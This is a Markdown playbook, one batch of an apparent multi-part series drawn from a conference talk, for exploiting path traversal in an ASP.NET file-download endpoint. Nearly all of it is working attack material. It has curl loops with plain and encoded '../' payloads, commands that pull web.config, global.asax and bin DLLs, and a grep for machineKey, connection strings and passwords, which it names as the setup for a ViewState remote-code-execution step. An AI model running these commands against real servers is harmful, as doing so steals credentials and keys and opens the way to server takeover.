# Batch 03 — Read files → web.config → DLLs

## FILL IN

```bash
# example from the talk — change to YOUR download URL + param name
BASE="https://TARGET/v1/DownloadCategoryExcel"
PARAM="fileName"
```

## GOAL
If a parameter is a file name, use `../` to read **web.config**, then **bin/*.dll**.

## TIME
~1 hour

## YOU NEED
- A download/export URL that takes a file name (from proxy history)
- Permission to test file read

---

## WHY (kid version)

Bad code does: `open(folder + user_input)`.  
You set user_input to `../../web.config` → climb out of the folder.

**web.config** often has:

- database passwords  
- **machineKey** (needed for RCE in batch 04)  
- DLL names under `bin/`

Talk order: `web.config` → `global.asax` → `bin/Company.Web.Api.dll`

---

## DO THIS

### 1) Prove `../` works

```bash
for p in '../../web.config' '..%2f..%2fweb.config' '..\..\web.config'; do
  echo "=== $p ==="
  curl -sk -G "$BASE" --data-urlencode "$PARAM=$p" -D- -o /tmp/out | head -15
  file /tmp/out
  head -c 200 /tmp/out; echo
done
```

**Win:** file looks like XML config (`<configuration>`), not an error page.

### 2) Save gold files (exact talk paths)

```bash
curl -sk -G "$BASE" --data-urlencode "$PARAM=../../web.config" -o web.config
curl -sk -G "$BASE" --data-urlencode "$PARAM=../../global.asax" -o global.asax
grep -iE 'machineKey|connectionString|password|namespace' web.config
```

### 3) Pull DLL named in config

If you see something like `Company.Web.Api`:

```bash
curl -sk -G "$BASE" --data-urlencode "$PARAM=../../bin/Company.Web.Api.dll" \
  -o Company.Web.Api.dll
file Company.Web.Api.dll
# should say PE32 / DLL — not HTML
```

Repeat for other assembly names.

### 4) Write 3 lines

```text
LFI: yes/no
machineKey: yes/no
DLL files:
```

---

## IF / THEN

| You see | You do |
|---------|--------|
| machineKey in web.config | → **04** now |
| DLL files only | → **05** |
| No LFI | → **06** if XML, **07** shortnames, **05** if vendor paths |

---

## NEXT
→ [04-viewstate-rce.md](./04-viewstate-rce.md) or [05-dnspy-dependencies.md](./05-dnspy-dependencies.md)

**Slides:** 13–15
